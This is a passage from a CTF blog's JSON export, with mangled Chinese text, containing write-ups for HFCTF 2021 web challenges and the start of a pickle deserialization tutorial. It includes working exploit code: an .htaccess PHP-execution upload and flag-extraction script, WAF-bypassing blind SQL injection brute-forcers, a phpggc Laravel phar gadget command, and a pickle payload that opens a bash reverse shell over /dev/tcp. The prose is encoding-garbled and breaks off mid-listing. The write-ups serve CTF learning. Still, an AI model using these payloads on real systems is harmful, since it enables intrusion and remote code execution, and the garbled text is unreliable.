AllowOverrideè¢«è®¾ç½®Allï¼Œè¿™ä¸ªå€¼ä¸ºNoneçš„æ—¶å€™æ˜¯ä¸ä¼šæœç´¢è¿™ä¸ªç›®å½•ä¸‹çš„.htaccessæ–‡ä»¶çš„ï¼Œä½†è¿™é‡Œä»£è¡¨æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ .htaccessæ–‡ä»¶æ›´æ”¹ä¸Šä¼ ç›®å½•çš„é…ç½®ï¼Œé‚£å‰é¢çš„è§£æå…³é—­å°±ä¸æ˜¯é—®é¢˜äº† 0x02 ä¸Šä¼ .htaccessæ–‡ä»¶1234567&lt;FilesMatch &quot;.htaccess&quot;&gt;SetHandler application&#x2F;x-httpd-phpRequire all grantedphp_flag engine 1&lt;&#x2F;FilesMatch&gt;#&lt;?php readfile(&#39;&#x2F;flag&#39;);?&gt; php_flagæ›´æ”¹é…ç½®engineçš„å¸ƒå°”å€¼ï¼Œå¯åŠ¨phpè§£æï¼Œè¿™é‡Œphp_flagä¸èƒ½æ”¾åœ¨FilesMatchå¤–é¢å¤§æ¦‚æ˜¯ä¼˜å…ˆçº§é—®é¢˜ï¼Œå¾…ç ”ç©¶ .htaccessçš„ä½¿ç”¨ï¼Œå¯ä»¥å‚è€ƒè¿™ä¸ªhttps://cloud.tencent.com/developer/article/1824057 é™¤æ­¤ä¹‹å¤–php_valueä¹Ÿå¯ä»¥æ›´æ”¹é…ç½®ï¼ˆä¸å¯ä»¥æ›´æ”¹å¸ƒå°”å€¼ï¼‰ å½“phpæ˜¯ä½œä¸ºapacheçš„æ¨¡å—ä½œç”¨æ—¶ï¼Œå¯ä»¥åœ¨apacheé…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨å®ƒä»¬æ›´æ”¹phpçš„é…ç½® å½“ç„¶ä¸æ˜¯æ‰€æœ‰é…ç½®éƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹å¼æ›´æ”¹ï¼Œå“ªäº›å¯ä»¥æ›´æ”¹çš„å¯ä»¥æŸ¥ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ payloadè¿™é‡Œå¯èƒ½æœ‰ç‚¹ç»•ï¼Œä¸Šé¢çš„payloadçš„ä½œç”¨è¿‡ç¨‹åº”è¯¥æ˜¯è¿™æ ·çš„ 1231.è¯·æ±‚uploadä¸‹çš„.htaccess2.æ ¹æ®é…ç½®ï¼Œå¼€å¯äº†.htaccessçš„ä½¿ç”¨ï¼Œapacheå°±ä¼šå¯»æ‰¾è¿™ä¸ªç›®å½•ä¸‹çš„.htaccessæ–‡ä»¶ï¼Œåº”ç”¨å…¶ä¸­é…ç½®ï¼Œæˆ‘ä»¬åœ¨å…¶ä¸­å†™äº†ä¸€ä¸ªæ–‡ä»¶åŒ¹é…ï¼ŒåŒ¹é….htaccessæ–‡ä»¶ï¼Œæˆ‘ä»¬è®¿é—®çš„å°±æ˜¯è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥åŒ¹é…æˆåŠŸï¼Œåº”ç”¨FilesMatchä¸­çš„é…ç½®ï¼Œä¸º.htaccessæŒ‡å®šå¤„ç†å™¨ä¸ºphpï¼Œå¼€å¯engine3.è¿™æ—¶å€™çš„.htaccesså·²ç»è¢«å½“ä½œphpæ–‡ä»¶æ¥çœ‹äº†ï¼Œæ‰€ä»¥åœ¨ä¸‹é¢å†™phpä»£ç ï¼Œå¯ä»¥è§£æ å¦å¤–ï¼Œåœ¨start.shä¸­æœ‰ é¶æœºæ¯1åˆ†é’Ÿä¼šæ¸…ç†ä¸€ä¸‹ä¸Šä¼ æ–‡ä»¶å¤¹çš„æ–‡ä»¶ï¼Œå¦‚æœä¸Šä¼ åè®¿é—®å‘ç°æ–‡ä»¶ä¸å­˜åœ¨ï¼Œé‚£å°±æ˜¯è¢«åˆ äº†ï¼Œå†è¯•ä¸€é ä¸Šä¼ è®¿é—®ï¼Œå³å¯æ‹¿åˆ°flag 0x03 ç¬¬äºŒç§è§£æ³•æ¥è‡ªNu1lçš„è§£æ³•ï¼Œé©¬å…‹ä¸€ä¸‹ å…ˆçœ‹ä¸€ä¸‹ä¸»è¦çš„payloadå½¢å¼ 123&lt;If &quot;file(&#39;&#x2F;flag&#39;)&#x3D;~ &#x2F;flag&#123;&#x2F;&quot;&gt;ErrorDocument 404 &quot;wupco&quot;&lt;&#x2F;If&gt; 1234567file():Read contents from a file (including line endings, when present)file()å¯ä»¥è¯»å–æ–‡ä»¶å†…å®¹word &quot;&#x3D;~&quot; regex&#x3D;~è¡¨ç¤ºæ­£åˆ™åŒ¹é…ErrorDocument 404 &quot;wupco&quot;:åœ¨è®¿é—®ä¸å­˜åœ¨é¡µé¢çš„æ—¶å€™è¿”å›â€œwupcoâ€ å…¶ä»–ä¸€äº›å‡½æ•°å’Œè¡¨è¾¾å¼å¯ä»¥åœ¨æ–‡æ¡£é‡Œé¢æŸ¥çœ‹ http://httpd.apache.org/docs/2.4/expr.html ç”±æ­¤å¯ä»¥å¼€å§‹æ³¨å…¥ exp.py 123456789101112131415161718192021222324import requestsimport stringurl = &#x27;http://b17d4c2d-6d9d-43fa-8179-558e860c80e4.node4.buuoj.cn/&#x27;myIp = &#x27;ebfb2fa6fd1346df575fb4a07e818f3b&#x27;alp = string.ascii_letters+string.digits+&#x27;&#123;-&#125;&#x27;#print(alp)flag = &#x27;&#x27;fileContent = &#x27;&#x27;&#x27;&lt;If &quot;file(&#x27;/flag&#x27;)=~ /^%s/&quot;&gt;ErrorDocument 404 &quot;wupco&quot;&lt;/If&gt;&#x27;&#x27;&#x27;for i in range(50): for c in alp: htaccess = fileContent%(flag+c) r1 = requests.post(url+&#x27;/index.php&#x27;, data=&#123;&#x27;submit&#x27;:&#x27;submit&#x27;&#125;, files=&#123;&#x27;file&#x27;:(&#x27;.htaccess&#x27;,htaccess)&#125;) r2 = requests.get(url+&#x27;/upload/&#x27;+myIp+&#x27;/a&#x27;) if &quot;wupco&quot; in r2.text: flag += c print(flag) break","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"CTF/æ–‡ä»¶ä¸Šä¼ ","permalink":"https://123-prog.github.io/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":".htaccess","slug":"htaccess","permalink":"https://123-prog.github.io/tags/htaccess/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://123-prog.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"(HFCTF 2021 Final)hatenum","slug":"HFCTF-2021-Final-hatenum","date":"2021-07-28T08:17:54.000Z","updated":"2021-09-22T10:15:42.280Z","comments":true,"path":"2021/07/28/HFCTF-2021-Final-hatenum/","link":"","permalink":"https://123-prog.github.io/2021/07/28/HFCTF-2021-Final-hatenum/","excerpt":"0x01","text":"0x01 æºç å¾ˆç®€å• home.php 123456789101112&lt;?phprequire_once(&#x27;config.php&#x27;);if(!$_SESSION[&#x27;username&#x27;])&#123; header(&#x27;location:index.php&#x27;);&#125;if($_SESSION[&#x27;username&#x27;]==&#x27;admin&#x27;)&#123; echo file_get_contents(&#x27;/flag&#x27;);&#125;else&#123; echo &#x27;hello &#x27;.$_SESSION[&#x27;username&#x27;];&#125;?&gt; è¦ä»¥adminç™»å½• login.php 123456789101112131415161718192021222324&lt;?phprequire_once(&#x27;config.php&#x27;);array_waf($_POST);if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;])&amp;&amp;isset($_POST[&#x27;code&#x27;]))&#123; $User = new User(); switch ($User-&gt;login($_POST[&#x27;username&#x27;],$_POST[&#x27;password&#x27;],$_POST[&#x27;code&#x27;])) &#123; case &#x27;success&#x27;: echo &#x27;login success&#x27;; header(&#x27;location:home.php&#x27;); break; case &#x27;fail&#x27;: echo &#x27;login fail&#x27;; header(&#x27;location:index.php&#x27;); break; case &#x27;error&#x27;: echo &#x27;error&#x27;; header(&#x27;location:index.php&#x27;); break; &#125;&#125;else&#123; die(&#x27;no use&#x27;);&#125;?&gt; è°ƒç”¨User-&gt;login() æ²¡æœ‰ç”¨é¢„å¤„ç†ï¼Œå¯ä»¥æ³¨å…¥ï¼Œå­˜åœ¨è¿‡æ»¤ 123&#x2F;union|select|or|and|\\&#39;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|&#x3D;|&gt;|&lt;| |\\*|,|;|\\r|\\n|\\t|substr|right|left|mid&#x2F;i\\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;&#x2F;i è¿‡æ»¤äº†å•å¼•å·ï¼Œå¯ä»¥ç”¨è½¬ä¹‰ç¬¦ï¼Œè”åˆé€ƒé€¸ åˆ©ç”¨exp(710)æº¢å‡ºæŠ¥é”™ï¼Œåœ¨æŸ¥è¯¢è¯­å¥å‡ºé”™çš„æ—¶å€™ä¼šè¿”å›ä¸€ä¸ªerrorï¼Œæ²¡æœ‰å‡ºé”™å°±æ˜¯ç™»å½•å¤±è´¥çš„ä¿¡æ¯æé†’ payload: 12345data = &#123; &#x27;username&#x27;:&#x27;xxx\\\\&#x27;, &#x27;password&#x27;:&#x27;||username rlike 0x61646d69&amp;&amp;exp(710-(24-length(code)))#&#x27;.replace(&#x27; &#x27;,&#x27;\\x0b&#x27;), &#x27;code&#x27;:&#x27;1&#x27;&#125; å¾—åˆ°adminçš„codeé•¿åº¦ä¸º23 æ¥ä¸‹æ¥çˆ†code ä¸»è¦é™åˆ¶äº†è¿™ä¸ªåå…­è¿›åˆ¶ä¸²çš„é•¿åº¦å˜å¾—æœ‰ç‚¹æ£˜æ‰‹(å› ä¸ºcodeä¸­æœ‰é‡å¤å­ä¸² çœ‹ç½‘ä¸Šå¤§ä½¬çš„æ–¹æ³•ï¼Œæ˜¯ä»å‰å¾€ååŒ¹é…ä¸€éï¼Œå†ä»åå¾€å‰åŒ¹é…ä¸€éï¼Œç»“åˆåˆ†æå¯ä»¥æ‹¿åˆ°é•¿åº¦23çš„code ä»å‰å¾€ååŒ¹é… 12345678910111213141516171819202122232425262728293031#coding=utf-8import requestsimport stringurl = &#x27;http://a8b2c06b-9cfa-4e27-b9f9-c150d52e0ca6.node4.buuoj.cn/login.php&#x27;alp = string.ascii_letters+string.digits+&quot;$&quot;#/union|select|or|and|\\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\\*|,|;|\\r|\\n|\\t|substr|right|left|mid/icode = &#x27;&#x27;str = &#x27;^&#x27;def str2hex(str): return &#x27;0x&#x27;+&#x27;&#x27;.join(hex(ord(x))[2:] for x in str)for i in range(23): for c in alp: if len(str) == 4: str = str[1:] #ä¿æŒpayloadä¸­stré•¿åº¦ä¸º4 data = &#123; &#x27;username&#x27;:&#x27;c4t\\\\&#x27;, &#x27;password&#x27;:&#x27;||username rlike 0x61646d69 &amp;&amp; exp(710-(code rlike binary &#123;&#125;))#&#x27;.format(str2hex(str+c)).replace(&#x27; &#x27;,&#x27;\\x0b&#x27;), &#x27;code&#x27;:&#x27;1&#x27; &#125; #print(data[&#x27;password&#x27;]) r = requests.post(url, data=data, allow_redirects=False) if &#x27;login fail&#x27; in r.text: str += c code += c print(str+&#x27; &#x27;+code) break å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œå‡ºç°å­ä¸²é‡å¤ï¼Œå› ä¸ºæ˜¯4ä¸ª4ä¸ªè¿›è¡ŒåŒ¹é…ï¼Œåªè¦æœ‰é•¿åº¦ä¸º3çš„ä¸¤ä¸ªå­ä¸²ä¸€æ ·ï¼Œå°±ä¼šåŒ¹é…åˆ°å‰é¢çš„å­—ä¸²ï¼Œå¯¼è‡´ä¸€ç›´å¾ªç¯ è¿™é‡Œæ˜¯gh2é‡å¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½æ‹¿åˆ°å‰ä¸€éƒ¨åˆ†erghruigh2uygh2 ä»åå¾€å‰åŒ¹é… 12345678910111213141516171819202122232425262728293031323334353637383940#coding=utf-8import requestsimport stringurl = &#x27;http://a8b2c06b-9cfa-4e27-b9f9-c150d52e0ca6.node4.buuoj.cn/login.php&#x27;alp = string.ascii_letters+string.digits+&quot;$&quot;#/union|select|or|and|\\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\\*|,|;|\\r|\\n|\\t|substr|right|left|mid/i&#x27;&#x27;&#x27;data = &#123; &#x27;username&#x27;:&#x27;c4t\\\\&#x27;, &#x27;password&#x27;:&#x27;||username rlike 0x61646d69&amp;&amp;exp(710-(24-length(code)))#&#x27;.replace(&#x27; &#x27;,&#x27;\\x0b&#x27;), &#x27;code&#x27;:&#x27;1&#x27;&#125;&#x27;&#x27;&#x27;code = &#x27;&#x27;str = &#x27;$&#x27;def str2hex(str): return &#x27;0x&#x27;+&#x27;&#x27;.join(hex(ord(x))[2:] for x in str)for i in range(23): for c in alp: if len(str) == 4: str = str[:-1] #ä¿æŒpayloadä¸­stré•¿åº¦ä¸º4 data = &#123; &#x27;username&#x27;:&#x27;c4t\\\\&#x27;, &#x27;password&#x27;:&#x27;||username rlike 0x61646d69 &amp;&amp; exp(710-(code rlike binary &#123;&#125;))#&#x27;.format(str2hex(c+str)).replace(&#x27; &#x27;,&#x27;\\x0b&#x27;), &#x27;code&#x27;:&#x27;1&#x27; &#125; #print(data[&#x27;password&#x27;]) r = requests.post(url, data=data, allow_redirects=False) if &#x27;login fail&#x27; in r.text: str = c + str code = c + code print(str+&#x27; &#x27;+code) break gh2çš„é‡å¤å¯¼è‡´ä»åå¾€å‰åŒ¹é…çš„æ—¶å€™ï¼Œä¸¤ä¸ªé‡å¤å­ä¸²ä¹‹å‰çš„éƒ¨åˆ†ä¼šè¢«è·³è¿‡ ç»“åˆä¸Šé¢ä»å‰å¾€ååŒ¹é…çš„ç»“æœ codeä¸ºï¼šerghruigh2uygh23uiu32ig ä»¥adminèº«ä»½ç™»å½•æ‹¿åˆ°flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"sqlæ³¨å…¥","slug":"CTF/sqlæ³¨å…¥","permalink":"https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://123-prog.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"(HFCTF 2021 Final)tinypng","slug":"HFCTF-2021-Final-tinypng","date":"2021-07-27T09:23:20.000Z","updated":"2021-09-22T10:17:45.284Z","comments":true,"path":"2021/07/27/HFCTF-2021-Final-tinypng/","link":"","permalink":"https://123-prog.github.io/2021/07/27/HFCTF-2021-Final-tinypng/","excerpt":"0x01æºç åˆ†æï¼Œå…ˆçœ‹ä¸€ä¸‹è·¯ç”±","text":"0x01æºç åˆ†æï¼Œå…ˆçœ‹ä¸€ä¸‹è·¯ç”± ä¸æ ¹è·¯ç”±POSTæ–¹æ³•å¯¹åº”çš„æ§åˆ¶ç±»æ˜¯IndexControllerï¼Œä¸è·¯ç”±/imageè·¯ç”±ç›¸å…³è”çš„æ˜¯ImageControlleræ§åˆ¶ç±» åˆ†åˆ«çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªæ§åˆ¶ç±» IndexController å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œåç¼€é™å®šä¸ºpngï¼Œå¯¹æ–‡ä»¶å†…å®¹æœ‰è¿‡æ»¤ preg_match(&quot;/&lt;\\?|php|HALT\\_COMPILER/i&quot;, $content ) è¿™é‡Œå¤§æ¦‚å¯ä»¥çŒœåˆ°æ˜¯pharååºåˆ—åŒ–äº†ï¼Œè¿‡æ»¤__HALT_COMPLIERå¯ä»¥ç”¨gzip/bzip2å‹ç¼©æ•°æ®ç»•è¿‡ï¼Œå‹ç¼©åå¹¶ä¸ä¼šå½±å“phar://çš„è¯»å–ï¼Œä½†éœ€è¦phpæœ‰ç›¸åº”çš„æ‰©å±• ImageController è¿™é‡Œå¯¹é€šè¿‡GETå¾—åˆ°çš„è·¯å¾„èµ„æºè¿›è¡Œimgcompress-&gt;compressImgï¼Œè·Ÿè¿›å»çœ‹ä¸€ä¸‹ æœ‰ä¸ªgetimagesize()ï¼Œå¯ä»¥è§¦å‘pharçš„ååºåˆ—åŒ– 0x02 åˆ©ç”¨é“¾phpggcä¸€æŠŠæ¢­ å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬ ç”¨phpggcç”Ÿæˆpayload 123./phpggc Laravel/RCE7 readfile &#x27;/flag&#x27; --phar phar &gt; 1.phargzip 1.pharmv 1.phar.gz 1.png","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpååºåˆ—åŒ–","slug":"CTF/phpååºåˆ—åŒ–","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"pharååºåˆ—åŒ–","slug":"pharååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"(HFCTF 2021 Final)easyflask","slug":"HFCTF-2021-Final-easyflask","date":"2021-07-24T15:57:00.000Z","updated":"2021-09-22T10:15:18.209Z","comments":true,"path":"2021/07/24/HFCTF-2021-Final-easyflask/","link":"","permalink":"https://123-prog.github.io/2021/07/24/HFCTF-2021-Final-easyflask/","excerpt":"0x01 æºç /file?file=/app/source","text":"0x01 æºç /file?file=/app/source 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/python3.6import osimport picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp = Flask(__name__)app.config[&quot;SECRET_KEY&quot;] = &quot;*******&quot;User = type(&#x27;User&#x27;, (object,), &#123; &#x27;uname&#x27;: &#x27;test&#x27;, &#x27;is_admin&#x27;: 0, &#x27;__repr__&#x27;: lambda o: o.uname,&#125;)@app.route(&#x27;/&#x27;, methods=(&#x27;GET&#x27;,))def index_handler(): if not session.get(&#x27;u&#x27;): u = pickle.dumps(User()) session[&#x27;u&#x27;] = u return &quot;/file?file=index.js&quot;@app.route(&#x27;/file&#x27;, methods=(&#x27;GET&#x27;,))def file_handler(): path = request.args.get(&#x27;file&#x27;) path = os.path.join(&#x27;static&#x27;, path) if not os.path.exists(path) or os.path.isdir(path) \\ or &#x27;.py&#x27; in path or &#x27;.sh&#x27; in path or &#x27;..&#x27; in path or &quot;flag&quot; in path: return &#x27;disallowed&#x27; with open(path, &#x27;r&#x27;) as fp: content = fp.read() return content@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))def admin_handler(): try: u = session.get(&#x27;u&#x27;) if isinstance(u, dict): u = b64decode(u.get(&#x27;b&#x27;)) u = pickle.loads(u) except Exception: return &#x27;uhh?&#x27; if u.is_admin == 1: return &#x27;welcome, admin&#x27; else: return &#x27;who are you?&#x27;if __name__ == &#x27;__main__&#x27;: app.run(&#x27;0.0.0.0&#x27;, port=80, debug=False) 0x02/adminè·¯ç”±ä¸‹çœ‹åˆ°äº†pickle.loads()ï¼Œpickleååºåˆ—åŒ– /file?file=/proc/self/environ æ‹¿åˆ°secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh ä¸‹ä¸ªåŠ å¯†è„šæœ¬https://github.com/noraj/flask-session-cookie-manager/blob/master/flask_session_cookie_manager3.py é‡å‘½ågetSession.py 12345678910111213141516171819202122232425#coding=utf-8import getSessionimport pickleimport osimport requestsUser = type(&#x27;User&#x27;, (object,), &#123; &#x27;uname&#x27;: &#x27;test&#x27;, &#x27;is_admin&#x27;: 0, &#x27;__repr__&#x27;: lambda o: o.uname, &#x27;__reduce__&#x27;: lambda o: (os.system,(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;,))&#125;)#payload = pickle.dumps(User())payload = &quot;&quot;&quot;b&#x27;\\\\x80\\\\x04\\\\x95P\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x8c\\\\x05posix\\\\x94\\\\x8c\\\\x06system\\\\x94\\\\x93\\\\x94\\\\x8c5bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;\\\\x94\\\\x85\\\\x94R\\\\x94.&#x27;&quot;&quot;&quot;secret_key = &#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;session_stru = &quot;&#123;&#x27;u&#x27;:&quot;+payload+&quot;&#125;&quot;session = getSession.FSCM.encode(secret_key,session_stru)url = &#x27;http://e3d3f18d-c6b3-4ebe-849b-649f67498bec.node4.buuoj.cn/admin&#x27;cookies = &#123;&#x27;session&#x27;:session&#125;r = requests.get(url, cookies=cookies) æˆåŠŸåå¼¹shellï¼Œæ‹¿åˆ°flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"python web","slug":"CTF/python-web","permalink":"https://123-prog.github.io/categories/CTF/python-web/"}],"tags":[{"name":"flask sessionä¼ªé€ ","slug":"flask-sessionä¼ªé€ ","permalink":"https://123-prog.github.io/tags/flask-session%E4%BC%AA%E9%80%A0/"},{"name":"pickleååºåˆ—åŒ–","slug":"pickleååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"pickle ååºåˆ—åŒ–","slug":"pickle-ååºåˆ—åŒ–","date":"2021-07-24T10:56:09.000Z","updated":"2021-07-24T16:04:58.101Z","comments":true,"path":"2021/07/24/pickle-ååºåˆ—åŒ–/","link":"","permalink":"https://123-prog.github.io/2021/07/24/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"0x01 picklepickle æ˜¯ä¸€ç§æ ˆè¯­è¨€ï¼Œæœ‰ä¸åŒçš„ç¼–å†™æ–¹å¼ï¼ŒåŸºäºä¸€ä¸ªè½»é‡çš„ PVMï¼ˆPickle Virtual Machineï¼‰ï¼ŒåŒ…å«ä¸‰å¤§éƒ¨åˆ†","text":"0x01 picklepickle æ˜¯ä¸€ç§æ ˆè¯­è¨€ï¼Œæœ‰ä¸åŒçš„ç¼–å†™æ–¹å¼ï¼ŒåŸºäºä¸€ä¸ªè½»é‡çš„ PVMï¼ˆPickle Virtual Machineï¼‰ï¼ŒåŒ…å«ä¸‰å¤§éƒ¨åˆ† 1.æ ˆï¼šç”±listå®ç°ï¼Œå­˜æ”¾ä¸´æ—¶çš„æ•°æ®ï¼Œæ“ä½œï¼Œå‚æ•°ç­‰ç­‰ 2.memo: ç”±dictå®ç°ï¼Œå­˜æ”¾å·²ç»åºåˆ—åŒ–çš„æ•°æ®ï¼Œåœ¨PVMæ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…ï¼Œæä¾›å­˜å‚¨çš„ç©ºé—´ 3.æŒ‡ä»¤å¤„ç†å™¨ï¼šè¯»å–opcodeå’Œå‚æ•°ï¼Œè§£é‡Šæ‰§è¡Œï¼Œé‡åˆ°.åœæ­¢è§£é‡Š pickleåè®®ç‰ˆæœ¬å¾ˆå¤šï¼Œæœ€å®¹æ˜“é˜…è¯»ï¼Œä¹Ÿæ˜¯æœ€å®¹æ˜“æ‰‹å†™çš„æ˜¯**v0**ï¼Œå› ä¸ºpickleç‰ˆæœ¬å‘ä¸‹å…¼å®¹ï¼Œæ‰€ä»¥ä¸å¿…æ‹…å¿ƒç‰ˆæœ¬ä¸å…¼å®¹å‡ºé”™çš„é—®é¢˜ ä¸¾ä¾‹ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„åˆ©ç”¨ 123456789101112import pickleimport osclass demo(object): def __reduce__(self): return system,(&#x27;whoami&#x27;,) d1 = demo()pickle_str = pickle.dumps(d1)print(pickle_str)#b&#x27;\\x80\\x03cnt\\nsystem\\nq\\x00X\\x06\\x00\\x00\\x00whoamiq\\x01\\x85q\\x02Rq\\x03.&#x27;#ä½¿ç”¨pickle.loads(pickle_str)å°±å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œ object.__reduce__(): é‡å†™ç±»çš„__reduce__()å‡½æ•°ï¼Œå¯ä»¥ä½¿ç±»åœ¨å®ä¾‹åŒ–çš„æ—¶å€™æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œï¼Œè¯¥å‡½æ•°è¿”å›ä¸€ä¸ªå…ƒç»„ï¼Œå…ƒç»„ç¬¬ä¸€ä¸ªå€¼æ˜¯è°ƒç”¨çš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªå€¼æ˜¯å‚æ•° 0x02 opcodeå„ä¸ªopcodeçš„ç”¨æ³• 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485MARK = b&#x27;(&#x27; # push special markobject on stackSTOP = b&#x27;.&#x27; # every pickle ends with STOPPOP = b&#x27;0&#x27; # discard topmost stack itemPOP_MARK = b&#x27;1&#x27; # discard stack top through topmost markobjectDUP = b&#x27;2&#x27; # duplicate top stack itemFLOAT = b&#x27;F&#x27; # push float object; decimal string argumentINT = b&#x27;I&#x27; # push integer or bool; decimal string argumentBININT = b&#x27;J&#x27; # push four-byte signed intBININT1 = b&#x27;K&#x27; # push 1-byte unsigned intLONG = b&#x27;L&#x27; # push long; decimal string argumentBININT2 = b&#x27;M&#x27; # push 2-byte unsigned intNONE = b&#x27;N&#x27; # push NonePERSID = b&#x27;P&#x27; # push persistent object; id is taken from string argBINPERSID = b&#x27;Q&#x27; # &quot; &quot; &quot; ; &quot; &quot; &quot; &quot; stackREDUCE = b&#x27;R&#x27; # apply callable to argtuple, both on stackSTRING = b&#x27;S&#x27; # push string; NL-terminated string argumentBINSTRING = b&#x27;T&#x27; # push string; counted binary string argumentSHORT_BINSTRING= b&#x27;U&#x27; # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytesUNICODE = b&#x27;V&#x27; # push Unicode string; raw-unicode-escaped&#x27;d argumentBINUNICODE = b&#x27;X&#x27; # &quot; &quot; &quot; ; counted UTF-8 string argumentAPPEND = b&#x27;a&#x27; # append stack top to list below itBUILD = b&#x27;b&#x27; # call __setstate__ or __dict__.update()GLOBAL = b&#x27;c&#x27; # push self.find_class(modname, name); 2 string argsDICT = b&#x27;d&#x27; # build a dict from stack itemsEMPTY_DICT = b&#x27;&#125;&#x27; # push empty dictAPPENDS = b&#x27;e&#x27; # extend list on stack by topmost stack sliceGET = b&#x27;g&#x27; # push item from memo on stack; index is string argBINGET = b&#x27;h&#x27; # &quot; &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argINST = b&#x27;i&#x27; # build &amp; push class instanceLONG_BINGET = b&#x27;j&#x27; # push item from memo on stack; index is 4-byte argLIST = b&#x27;l&#x27; # build list from topmost stack itemsEMPTY_LIST = b&#x27;]&#x27; # push empty listOBJ = b&#x27;o&#x27; # build &amp; push class instancePUT = b&#x27;p&#x27; # store stack top in memo; index is string argBINPUT = b&#x27;q&#x27; # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argLONG_BINPUT = b&#x27;r&#x27; # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 4-byte argSETITEM = b&#x27;s&#x27; # add key+value pair to dictTUPLE = b&#x27;t&#x27; # build tuple from topmost stack itemsEMPTY_TUPLE = b&#x27;)&#x27; # push empty tupleSETITEMS = b&#x27;u&#x27; # modify dict by adding topmost key+value pairsBINFLOAT = b&#x27;G&#x27; # push float; arg is 8-byte float encodingTRUE = b&#x27;I01\\n&#x27; # not an opcode; see INT docs in pickletools.pyFALSE = b&#x27;I00\\n&#x27; # not an opcode; see INT docs in pickletools.py# Protocol 2PROTO = b&#x27;\\x80&#x27; # identify pickle protocolNEWOBJ = b&#x27;\\x81&#x27; # build object by applying cls.__new__ to argtupleEXT1 = b&#x27;\\x82&#x27; # push object from extension registry; 1-byte indexEXT2 = b&#x27;\\x83&#x27; # ditto, but 2-byte indexEXT4 = b&#x27;\\x84&#x27; # ditto, but 4-byte indexTUPLE1 = b&#x27;\\x85&#x27; # build 1-tuple from stack topTUPLE2 = b&#x27;\\x86&#x27; # build 2-tuple from two topmost stack itemsTUPLE3 = b&#x27;\\x87&#x27; # build 3-tuple from three topmost stack itemsNEWTRUE = b&#x27;\\x88&#x27; # push TrueNEWFALSE = b&#x27;\\x89&#x27; # push FalseLONG1 = b&#x27;\\x8a&#x27; # push long from &lt; 256 bytesLONG4 = b&#x27;\\x8b&#x27; # push really big long_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]# Protocol 3 (Python 3.x)BINBYTES = b&#x27;B&#x27; # push bytes; counted binary string argumentSHORT_BINBYTES = b&#x27;C&#x27; # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytes# Protocol 4SHORT_BINUNICODE = b&#x27;\\x8c&#x27; # push short string; UTF-8 length &lt; 256 bytesBINUNICODE8 = b&#x27;\\x8d&#x27; # push very long stringBINBYTES8 = b&#x27;\\x8e&#x27; # push very long bytes stringEMPTY_SET = b&#x27;\\x8f&#x27; # push empty set on the stackADDITEMS = b&#x27;\\x90&#x27; # modify set by adding topmost stack itemsFROZENSET = b&#x27;\\x91&#x27; # build frozenset from topmost stack itemsNEWOBJ_EX = b&#x27;\\x92&#x27; # like NEWOBJ but work with keyword only argumentsSTACK_GLOBAL = 